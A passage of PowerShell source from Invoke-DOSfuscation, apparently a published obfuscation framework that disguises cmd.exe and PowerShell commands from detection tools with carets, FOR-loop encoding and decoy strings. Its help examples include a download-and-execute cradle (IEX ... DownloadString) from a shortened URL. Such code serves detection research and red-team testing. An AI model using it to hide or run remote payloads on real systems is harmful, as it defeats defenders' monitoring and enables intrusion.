    $randomChar7  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar8  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar9  = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar10 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar11 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar12 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar13 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar14 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar15 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar16 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar17 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray
    $randomChar18 = Get-RandomWhitespaceAndRandomChar -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharArray:$RandomCharArray

    # Randomly select a comparison operation syntax to perform against bookend index value.
    # These options are '==' (string comparison of integers) or EQU (==), LSS (<) and LEQ (<=) for integer comparisons compatible with cmd.exe's IF command (https://ss64.com/nt/if.html).
    $spaceForRandomCharB = ''
    if ($randomCharB.Length -eq 0)
    {
        $spaceForRandomCharB = ' '
    }
    $doubleEqual = '=='
    $commandIndexBookend = $commandIndexArray[2]
    $commandIndexBookendPlus1 = ($commandIndexArray[2] + 1)
    
    # Add random carets if -RandomCaret switch is set.
    if ($RandomCaret.IsPresent)
    {
        $doubleEqual              = Out-ObfuscatedCaret -StringToObfuscate $doubleEqual              -RandomCaretPercent:$RandomCaretPercent
        $commandIndexBookend      = Out-ObfuscatedCaret -StringToObfuscate $commandIndexBookend      -RandomCaretPercent:$RandomCaretPercent
        $commandIndexBookendPlus1 = Out-ObfuscatedCaret -StringToObfuscate $commandIndexBookendPlus1 -RandomCaretPercent:$RandomCaretPercent
    
        # '==' cannot start with a caret, so trim.
        $doubleEqual = $doubleEqual.TrimStart('^')
    }

    # Randomly add explicit '+' or '-' sign to positive index value option if -RandomChar is selected.
    $randomPlusOrMinusSign1  = ''
    $randomPlusOrMinusSign2  = ''
    if ($RandomChar.IsPresent -and ((Get-Random -InputObject @(1..100)) -le $RandomCharPercent))
    {
        if ($commandIndexBookend -eq 0)
        {
            $randomPlusOrMinusSign1 = Get-Random -InputObject @('-','+')
        }
        elseif ($commandIndexBookend -gt 0)
        {
            $randomPlusOrMinusSign1 = '+'
        }
    
        if ($commandIndexBookendMinus1 -eq 0)
        {
            $randomPlusOrMinusSign2 = Get-Random -InputObject @('-','+')
        }
        elseif ($commandIndexBookendMinus1 -gt 0)
        {
            $randomPlusOrMinusSign2 = '+'
        }
    }

    # Randomly select a comparison operation syntax to perform against bookend index value.
    # These options are '==' (string comparison of integers) or EQU (==), GEQ (>=) and GTR (>) for integer comparisons compatible with cmd.exe's IF command (https://ss64.com/nt/if.html).
    $bookendComparison = $randomCharA + (Get-Random -InputObject ("$doubleEqual$randomCharB$commandIndexBookend","$spaceForRandomCharB$equ$spaceForRandomCharB$randomCharB$randomPlusOrMinusSign1$commandIndexBookend","$spaceForRandomCharB$leq$spaceForRandomCharB$randomCharB$randomPlusOrMinusSign1$commandIndexBookend","$spaceForRandomCharB$lss$spaceForRandomCharB$randomCharB$randomPlusOrMinusSign2$commandIndexBookendPlus1"))
 
    # Ensure that bookend starts with a whitespace if value starts with the integer comparisons EQU (==), LSS (<) or LEQ (<=). Take into account potential obfuscation characters as they do not count as whitespace for this check.
    if (@('e','l') -contains ($bookendComparison -replace '[^\w\s]','')[0])
    {
        $bookendComparison = ' ' + $bookendComparison
    }

    # If -RandomChar argument is selected then add random parenthese layers where applicable based on $RandomCharRange.
    if ($RandomChar.IsPresent)
    {
        # Retrieve parenthesis counts from $randomCharRange so we get a balanced number of left and right parentheses from Get-RandomWhitespaceAndRandomChar.
        $parenCount1 = Get-Random -InputObject $randomCharRange -Count 1
        $parenCount2 = Get-Random -InputObject $randomCharRange -Count 1

        # Get random left and right parentheses with random whitespace if -RandomWhitespace argument is selected and with random commas and/or semicolons delimiters if -RandomChar argument is selected.
        $leftParen1  = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount1) | foreach-object { '(' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $rightParen1 = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount1) | foreach-object { ')' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $leftParen2  = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount2) | foreach-object { '(' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $rightParen2 = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount2) | foreach-object { ')' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
    
        # Trim leading delimiters and whitespace from parentheses since they will cause errors for variable SET commands inside FOR loops and PowerShell payloads.
        $leftParen1  = $leftParen1.Trim(' ,;')
        $rightParen1 = $rightParen1.Trim(' ,;')
        $leftParen2  = $leftParen2.Trim(' ,;')
        $rightParen2 = $rightParen2.Trim(' ,;')
    }
    else
    {
        $leftParen1  = ''
        $rightParen1 = ''
        $leftParen2  = ''
        $rightParen2 = ''
    }

    # If -RandomChar argument is selected then handle random commas/semicolons later in this function but ensure that the cmd.exe path ends with a comma/semicolon.
    # This is to highlight an obfuscation technique that many defenders' tools do not handle when attempting to look up a file, namely many assume the extension is ".exe," and fail to find the file on disk.
    if ($RandomChar.IsPresent)
    {
        $CmdSyntax  = $CmdSyntax.TrimEnd()  + (Get-Random -InputObject $RandomCharArray)
        $Cmd2Syntax = $Cmd2Syntax.TrimEnd() + (Get-Random -InputObject $RandomCharArray)
    }

    # If $CmdSyntax involves a path then whitespace is required after $CmdSyntax.
    if (($CmdSyntax -match '(:[\/\\]|\\\\|\/\/|\%.*\%)') -and -not $CmdSyntax.EndsWith(' '))
    {
        $CmdSyntax += ' '
    }

    # If $Cmd2Syntax involves a path then whitespace is required after $Cmd2Syntax.
    if (($Cmd2Syntax -match '(:[\/\\]|\\\\|\/\/|\%.*\%)') -and -not $Cmd2Syntax.EndsWith(' '))
    {
        $Cmd2Syntax += ' '
    }

    # If using one of the more intricate Cmd syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricateCmdSyntax)
    {
        # No additional escaping is needed for $CmdSyntax since it is the very beginning of the command. Later intricate syntaxes ($Cmd2Syntax and $PowerShellSyntax) will need additional escaping.
        
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        # Since this is the beginning of the whole command ensure that this single-alphanumeric variable is not accidentally present (particular NOT as a variable) in the remaining command.
        do
        {
            $cmdSyntaxVarName = Get-RandomVarName -UniqueFirstChar
        }
        while (([System.String] $setCommandArray).ToLower().Contains("%$cmdSyntaxVarName".ToLower()))

        if ($RandomCaret.IsPresent)
        {
            $cmdSyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $cmdSyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($CmdSyntax -match $intricateForLoopRegex1)
        {
            $CmdSyntax = $CmdSyntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $cmdSyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($CmdSyntax -match $intricateForLoopRegex2)
        {
            $CmdSyntax = $CmdSyntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $cmdSyntaxVarName)
        }
    }

    # If using one of the more intricate Cmd syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricateCmd2Syntax)
    {
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        $cmd2SyntaxVarName = Get-RandomVarName -UniqueFirstChar
        if ($RandomCaret.IsPresent)
        {
            $cmd2SyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $cmd2SyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($Cmd2Syntax -match $intricateForLoopRegex1)
        {
            $Cmd2Syntax = $Cmd2Syntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $cmd2SyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($Cmd2Syntax -match $intricateForLoopRegex2)
        {
            $Cmd2Syntax = $Cmd2Syntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $cmd2SyntaxVarName)
        }

        # Perform additional escaping for string tokens in the intricate syntax.
        $Cmd2SyntaxExtraCarets = $Cmd2Syntax
        $stringsToEscape = [System.Management.Automation.PSParser]::Tokenize($Cmd2Syntax,[ref] $null) | where-object { $_.Type -eq 'String' }
        foreach ($stringToEscape in $stringsToEscape)
        {
            # Perform single layer of escaping for delims= and tokens= values in intricate syntax and store in $Cmd2SyntaxExtraCarets variable for seletive use in final command assembly.
            if ($stringToEscape.Content.Replace('^','').ToLower().Contains('delims=') -and $stringToEscape.Content.Replace('^','').ToLower().Contains('tokens='))
            {
                if ($RandomCaret.IsPresent)
                {
                    $escapedString = Out-ObfuscatedCaret -StringToObfuscate $stringToEscape.Content.Replace('^','') -RandomCaretPercent:$RandomCaretPercent
                    $Cmd2SyntaxExtraCarets = $Cmd2SyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
                }
            }
            else
            {
                $escapedString = (Out-EscapedPowerShell -CommandToEscape $stringToEscape.Content -StdIn:$StdIn)
                $Cmd2Syntax = $Cmd2Syntax.Replace($stringToEscape.Content,$escapedString)
                $Cmd2SyntaxExtraCarets = $Cmd2SyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
            }
        }
    }

    # If using one of the more intricate PowerShell syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricatePowerShellSyntax)
    {
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        $powershellSyntaxVarName = Get-RandomVarName -UniqueFirstChar
        if ($RandomCaret.IsPresent)
        {
            $powershellSyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $powershellSyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($PowerShellSyntax -match $intricateForLoopRegex1)
        {
            $PowerShellSyntax = $PowerShellSyntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $powershellSyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($PowerShellSyntax -match $intricateForLoopRegex2)
        {
            $PowerShellSyntax = $PowerShellSyntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $powershellSyntaxVarName)
        }

        # Perform additional escaping for string tokens in the intricate syntax.
        $powerShellSyntaxExtraCarets = $PowerShellSyntax
        $stringsToEscape = [System.Management.Automation.PSParser]::Tokenize($PowerShellSyntax,[ref] $null) | where-object { $_.Type -eq 'String' }
        foreach ($stringToEscape in $stringsToEscape)
        {
            # Perform single layer of escaping for delims= and tokens= values in intricate syntax and store in $powerShellSyntaxExtraCarets variable for seletive use in final command assembly.
            if ($stringToEscape.Content.Replace('^','').ToLower().Contains('delims=') -and $stringToEscape.Content.Replace('^','').ToLower().Contains('tokens='))
            {
                if ($RandomCaret.IsPresent)
                {
                    $escapedString = Out-ObfuscatedCaret -StringToObfuscate $stringToEscape.Content.Replace('^','') -RandomCaretPercent:$RandomCaretPercent
                    $powerShellSyntaxExtraCarets = $powerShellSyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
                }
            }
            else
            {
                $escapedString = (Out-EscapedPowerShell -CommandToEscape $stringToEscape.Content -StdIn:$StdIn)
                $PowerShellSyntax = $PowerShellSyntax.Replace($stringToEscape.Content,$escapedString)
                $powerShellSyntaxExtraCarets = $powerShellSyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
            }
        }
    }

    # Ensure proper spacing after $CmdSyntax in $DecoyString1.
    if (-not ($randomChar1 -or $CmdSyntax.EndsWith(' ')) -and -not $DecoyString1.StartsWith(' '))
    {
        $DecoyString1 = ' ' + $DecoyString1
    }

    # Ensure specific $randomChar* variables are at least one whitespace if they are not defined.
    if (-not $randomChar5 ) { $randomChar5  = ' ' }
    if (-not $randomChar6 ) { $randomChar6  = ' ' }
    if (-not $randomChar7 ) { $randomChar7  = ' ' }
    if (-not $randomChar8 ) { $randomChar8  = ' ' }
    if (-not $randomChar10) { $randomChar10 = ' ' }
    if (-not $randomChar13) { $randomChar13 = ' ' }
    if (-not $randomChar15) { $randomChar15 = ' ' }
    if (-not $randomChar16) { $randomChar16 = ' ' }
    if (-not $randomChar18) { $randomChar18 = ' ' }

    # Handle final syntax for -FinalBinary options of 'none' (default), 'powershell' and 'cmd' along with the optional -StdIn switch.
    if ($FinalBinary -eq 'none')
    {
        $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$setCommandArray$randomChar4$for$randomChar5/$l$randomChar6%$forLoopIndexVarName$randomChar7$in$randomChar8($commandIndexes)$randomChar9$do$randomChar10$leftParen1$randomChar11$set $randomSpace2$forLoopCommandVarName=!$forLoopCommandVarName!!$setCommandVarArray`:~$randomSpace3%$forLoopIndexVarName,$randomSpace4`1!$rightParen1$andAnd$randomChar12$if$randomChar13%$forLoopIndexVarName$randomChar14$bookendComparison$randomChar15$leftParen2$call$randomChar16%$forLoopCommandVarName`:$finalSubstringIndex%$randomSpace6$rightParen2$randomSpace7`""
    }
    elseif ($FinalBinary -eq 'powershell')
    {
        # Use PowerShell syntax with carets added to delims= and values= value if -RandomCaret is selected and intricate syntax is used.
        if ($intricatePowerShellSyntax)
        {
            $PowerShellSyntax = $powerShellSyntaxExtraCarets
        }

        # If the input PowerShell command contains a semicolon then if it is delimiting numerous commands we cannot encapsulate the PowerShell command with parentheses.
        if ($Command.Contains(';'))
        {
            $leftParen2  = ''
            $rightParen2 = ''
        }
        else
        {
            # If parentheses remain to encapsulate the input PowerShell command then we need to remove any obfuscation delimiters (, and/or ;) from the obfuscated parentheses.
            $leftParen2  = $leftParen2  -replace '[,;]',''
            $rightParen2 = $rightParen2 -replace '[,;]',''
        }

        if ($StdIn.IsPresent)
        {
            # An additional layer of escaping for already-escaped '=' signs is required.
            if ($intricatePowerShellSyntax)
            {
                if ($PowerShellSyntax -match '[^\^](\^{6})=')
                {
                    $PowerShellSyntax = $PowerShellSyntax.Replace('^^^^^^=','^^^^^^^=')
                }
                elseif ($PowerShellSyntax -match '[^\^](\^{2})=')
                {
                    $PowerShellSyntax = $PowerShellSyntax.Replace('^^=','^^^=')
                }
            }

            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$setCommandArray$randomChar4$for$randomChar5/$l$randomChar6%$forLoopIndexVarName$randomChar7$in$randomChar8($commandIndexes)$randomChar9$do$randomChar10$leftParen1$randomChar11$set $randomSpace2$forLoopCommandVarName=!$forLoopCommandVarName!!$setCommandVarArray`:~$randomSpace3%$forLoopIndexVarName,$randomSpace4`1!$rightParen1$andAnd$randomChar12$if$randomChar13%$forLoopIndexVarName$bookendComparison$randomChar15$leftParen2$echo$($randomChar16.Replace(',',';'))!$forLoopCommandVarName`:$finalSubstringIndex!$($randomChar18.Replace(',',';'))|$randomChar17$PowerShellSyntax $randomSpace6-$rightParen2$randomSpace7`""
        }
        else
        {
            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$setCommandArray$randomChar4$for$randomChar5/$l$randomChar6%$forLoopIndexVarName$randomChar7$in$randomChar8($commandIndexes)$randomChar9$do$randomChar10$leftParen1$randomSpace2$set $randomSpace3$forLoopCommandVarName=!$forLoopCommandVarName!!$setCommandVarArray`:~$randomSpace4%$forLoopIndexVarName,$randomSpace5`1!$rightParen1$andAnd$randomChar11$if$randomChar13%$forLoopIndexVarName$bookendComparison$randomChar15$leftParen2$PowerShellSyntax$($randomChar16.Replace(',',';'))`"!$forLoopCommandVarName`:$finalSubstringIndex!`"$rightParen2$($randomChar15.Replace(',',';'))`""
        }
    }
    else
    {
        # Use Cmd2 syntax with carets added to delims= and values= value if -RandomCaret is selected and intricate syntax is used.
        if ($intricateCmd2Syntax)
        {
            $Cmd2Syntax = $cmd2SyntaxExtraCarets
        }

        if ($StdIn.IsPresent)
        {
            # An additional layer of escaping for already-escaped '=' signs is required.
            if ($intricateCmd2Syntax)
            {
                $Cmd2Syntax = $Cmd2Syntax.Replace('^^=','^^^=')

                if ($Cmd2Syntax -match '[^\^](\^{6})=')
                {
                    $Cmd2Syntax = $Cmd2Syntax.Replace('^^^^^^=','^^^^^^^=')
                }
            }

            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$setCommandArray$randomChar4$for$randomChar5/$l$randomChar6%$forLoopIndexVarName$randomChar7$in$randomChar8($commandIndexes)$randomChar9$do$randomChar10$leftParen1$randomChar11$set $randomSpace2$forLoopCommandVarName=!$forLoopCommandVarName!!$setCommandVarArray`:~$randomSpace3%$forLoopIndexVarName,$randomSpace4`1!$rightParen1$andAnd$randomChar12$if$randomChar13%$forLoopIndexVarName$bookendComparison$randomChar15$leftParen2$echo$randomChar18!$forLoopCommandVarName`:$finalSubstringIndex!$randomSpace6|$randomChar16$Cmd2Syntax$rightParen2$randomChar17`""
        }
        else
        {
            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$setCommandArray$randomChar4$for$randomChar5/$l$randomChar6%$forLoopIndexVarName$randomChar7$in$randomChar8($commandIndexes)$randomChar9$do$randomChar10$leftParen1$randomChar11$set $randomSpace2$forLoopCommandVarName=!$forLoopCommandVarName!!$setCommandVarArray`:~$randomSpace3%$forLoopIndexVarName,$randomSpace4`1!$rightParen1$andAnd$randomChar12$if$randomChar13%$forLoopIndexVarName$bookendComparison$randomChar15$leftParen2$Cmd2Syntax$randomChar16/$c2$randomChar18!$forLoopCommandVarName`:$finalSubstringIndex!$rightParen2$randomSpace6`""
        }
    }

    # Throw warning if command size exceeds cmd.exe's 8,190 character limit.
    $cmdMaxLength = 8190
    if ($finalCommand.Length -gt $cmdMaxLength)
    {
        Write-Warning "This command exceeds the cmd.exe maximum allowed length of $cmdMaxLength characters! Its length is $($finalCommand.Length) characters."
        Start-Sleep -Seconds 1
    }

    # Return final command.
    return $finalCommand
}


function Out-DosFORcodedCommand
{
<#
.SYNOPSIS

Out-DosFORcodedCommand obfuscates input cmd.exe and powershell.exe commands via numerous methods supported by cmd.exe including:
    1)  numerous layers of escaping
    2)  index-based encoding and in-memory reassembly of command via cmd.exe's FOR loop with variable expansion enabled
    3)  intentionally-placed variable expansion inside FOR loop via cmd.exe's CALL and /V:ON switch
    4)  optional randomized casing
    5)  optional randomized variable names
    6)  optional whitespace obfuscation
    7)  optional caret obfuscation
    8)  optional index delimiters
    9)  optional garbage index delimiters
    10) optional comma, semicolon and parentheses obfuscation
    11) optional intricate syntax for cmd.exe and powershell.exe
    12) cmd.exe's and powershell.exe's ability to execute commands via Standard Input

Invoke-DOSfuscation Function: Out-DosFORcodedCommand
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-RandomCase, Get-RandomVarName, Out-SetVarCommand, Split-Command, Test-ContainsEscapableCharacter, Out-EscapedPowerShell, Test-ContainsUnevenDoubleQuote, Remove-Tab, Out-ObfuscatedArray, Out-ObfuscatedCaret (all located in Invoke-DOSfuscation.psm1)
Optional Dependencies: None
 
.DESCRIPTION

Out-DosFORcodedCommand obfuscates input cmd.exe and powershell.exe commands via string indexing and in-memory command reassembly performed in the context of cmd.exe's FOR loop with variable expansion enabled.

.PARAMETER Command

Specifies the command to obfuscate with string indexing and in-memory command reassembly via cmd.exe's FOR loop syntax. This input command can also be obfuscated like: net""stat -""ano | find "127.0.0.1"

.PARAMETER FinalBinary

(Optional) Specifies the obfuscated command should be executed by a child process of powershell.exe, cmd.exe or no unnecessary child process (default). Some command escaping scenarios require at least one child process to avoid errors and will automatically be converted to such necessary syntax.

.PARAMETER ObfuscationLevel

(Optional) Specifies the preset obfuscation "profile" of all below parameters adjusted for -Command length. This is to simplify general usage of this function without becoming overwhelmed by all of the options.

.PARAMETER CmdSyntax

(Optional) Specifies the syntax to reference the initial cmd.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER Cmd2Syntax

(Optional) Specifies the syntax to reference the final cmd.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER PowerShellSyntax

(Optional) Specifies the syntax to reference powershell.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER StdIn

(Optional) Specifies that the final command be executed by ECHO'ing it into cmd.exe (or powershell.exe if -PowerShell is specified) to be executed via StdIn. This prevents the arguments from appearing in the final binary's command line arguments.

.PARAMETER DecoyString1

(Optional) Specifies the decoy string to set after the initial cmd.exe and before the /V or /C flags.

.PARAMETER DecoyString2

(Optional) Specifies the decoy string to set after the initial /V flag and before the /C flag.

.PARAMETER VFlag

(Optional) Specifies the decoy string (starting with "V") for the /V:ON flag as long as it is not /V:OFF.

.PARAMETER DecoySetCommandString

(Optional) Specifies the string to set as the initial process-level environment variable for custom appearances. This string is used to reassemble the input -Command value, and any characters missing from -Command are randomly appended onto -DecoySetCommandString.

.PARAMETER DecoySetCommandChars

(Optional) Specifies the array of characters to add to the unique characters found in -Command and to randomly assign in the initial process-level environment variable used to reassemble the input -Command value.

.PARAMETER RandomCase

(Optional) Specifies that random casing be used wherever possible.

.PARAMETER RandomSpace

(Optional) Specifies that random whitespace be input wherever possible.

.PARAMETER RandomSpaceRange

(Optional) Specifies the range of the length of each randomly-selected whitespace if -RandomSpace is also selected.

.PARAMETER RandomFlag

(Optional) Specifies that random flag values be selected wherever possible (e.g. /C and /R interchangeability, environment variable encoding for /C and /V, etc.).

.PARAMETER RandomCaret

(Optional) Specifies that random carets be added before non-escapable characters in syntax components not affected by caret escape characters.

.PARAMETER RandomCaretPercent

(Optional) Specifies the percentage of characters to obfuscate with caret escape characters if -RandomCaret is also selected.

.PARAMETER RandomChar

(Optional) Specifies that random commas, semicolons and parentheses be input wherever possible in the command.

.PARAMETER RandomCharRange

(Optional) Specifies the range of the count of commas, semicolons and parentheses to be input wherever possible in the command if -RandomChar is also selected.

.PARAMETER RandomCharPercent

(Optional) Specifies the percentage of eligible characters to insert commas, semicolons and parentheses into if -RandomChar is also selected.

.PARAMETER RandomCharArray

(Optional) Specifies the character or array of characters (only comma and semicolon) to use if -RandomChar is also selected.

.PARAMETER VarNameSpecialChar

(Optional) Specifies that variable names to be comprised entirely of special characters.

.PARAMETER VarNameWhitespace

(Optional) Specifies that variable names to be comprised entirely of whitespace characters following a mandatory initial non-VarNameWhitespace character (randomly-selected special character).

.EXAMPLE

C:\PS> 'netstat -ano' | Out-DosFORcodedCommand

cmd /V:O/C"set ePr=nt-ae so&&for %d in (0 4 1 6 1 3 1 5 2 3 0 7 17)do set Gay4=!Gay4!!ePr:~%d,1!&&if %d geq 17 call %Gay4:~-12%"

.EXAMPLE

C:\PS> 'netstat -ano' | Out-DosFORcodedCommand -ObfuscationLevel 3

^f^o^r ,  ,  /^f ; , "  delims==.qD   tokens=    +1   "  ;  ; ;  %^u  ; ; ; ^iN ; ;  (  ; ;  ,  '  , ;  ,  ^^a^^s^^sO^^C  ,  , ^|  , ;  ^^f^^iN^^D^^S^^T^^R  ;  ;  ^^m^^d^=    '  ;  ; )  ;  , ;  ^d^o  ;  ; %^u;  ;  ,  5A74/vc^w{^3uG@^ ^ -Rand^o^m^C^a^ret^Pe^r^cen^t:^8^6  ;  ;  ;  LiR/^C  " ; ; (   ;   ;   ;   (  ,    (^S^Et ^ ^ ^ ^\^ ^ ^ =^sn^-^o^ ^t^a^e) ) ; ; ; )&&      ,  ; ;  ^F^o^R ,  ,  %^r ,  ;  ^In  , ,  (^ ^ ^ ^ ^ ^ ^  ^ ^ ^ ^ ^ ^ ^ ^+^1^ ^ ^ ^+^7^ ^ ^ ^ ^ ^ ^  ^ ^ ^ ^ ^ ^ ^ ^ ^+^5^ ^ ^ ^ ^ ^ ^ ^  ^ ^+0^ ^ ^ ^ ^ ^ ^ ^ ^  ^ ^+^5^  ^ ^ ^ ^ ^ ^ ^ ^ ^ ^+^6^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^  +^5^ ^ ^ ^ ^ ^ ^  ^ ^ ^ ^ ^ ^ ^+^4^ ^ ^ ^2^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^+^6^ ^ ^ ^  ^ ^ ^ ^ ^ ^ ^ ^ ^ ^1 ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^+^3^ ^ ^ ^ ^+^1^3)  ;  , ; ^d^o ( , ( ; ; ; (^s^e^t   @^ ^ ^ ^ =!@^ ^ ^ ^ !!^\^ ^ ^ :~    %^r,  1!)   ,   )  )&& ,  ; ^I^F ; ,  , %^r ;  ;  ^e^Q^u ;  ;  , ^+1^3 , ;  (    (^CA^l^l  , , %@^ ^ ^ ^ :^~^ ^ ^ ^ ^+^7%) )   "

.EXAMPLE

C:\PS> Out-DosFORcodedCommand -Command 'netstat -ano' -CmdSyntax '%ProgramData:~0,1%%ProgramData:~9,2%' -StdIn

%ProgramData:~0,1%%ProgramData:~9,2% /V/C"set Gj9=t -onase&&for %T in (4,7,0,6,0,5,0,1,2,5,4,3,12)do set VfwJ=!VfwJ!!Gj9:~%T,1!&&if %T equ 12 call %VfwJ:~-12%"

.EXAMPLE

C:\PS> Out-DosFORcodedCommand -Command 'net""stat -""ano | find "0.0.0.0"' -CmdSyntax 'c:\does\not\exist\..\..\..\windows\system32\cmd.exe' -RandomCase -RandomSpace -VarNameSpecialChar -StdIn

C:\does\not\EXisT\..\..\..\WInDOws\sYsTEm32\CMD.Exe /V: /c"  SEt     $.,_=""n^|f^^otdi 0a.-es&&   foR %W  iN ( 2 15   7  1 1   16   7 12 7 10 14    1  1    12   2 6 10  5   3   10   4  9   2 8   10 1  11   13 11    13 11   13 11 1 18)  dO SEt ]-[=!]-[!!$.,_:~  %W,  1!& iF  %W equ 18  eCHo  !]-[:~  -34!|  cmd"

.EXAMPLE

C:\PS> Out-DosFORcodedCommand -Command 'IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/L3g1t")' -RandomCase -RandomSpace -RandomSpaceRange @(5..15) -VarNameWhitespace -FinalBinary 'powershell' -RandomChar -RandomCharRange @(3..7) -RandomCharPercent 65

